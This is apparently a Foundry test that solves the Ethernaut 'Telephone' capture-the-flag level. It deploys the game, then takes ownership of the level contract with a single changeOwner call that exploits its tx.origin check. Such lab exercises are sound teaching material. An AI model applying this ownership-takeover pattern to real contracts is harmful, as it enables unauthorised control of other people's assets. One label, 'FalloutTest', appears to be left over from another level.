pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";

contract TelephoneTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Telephone ethernautTelephone;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "FalloutTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        ethernautTelephone = Telephone(payable(levelAddress));

        vm.label(address(ethernautTelephone), "EthernautTelephone");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        ethernautTelephone.changeOwner(alice);

        assertEq(ethernautTelephone.owner(), alice);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautTelephone)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}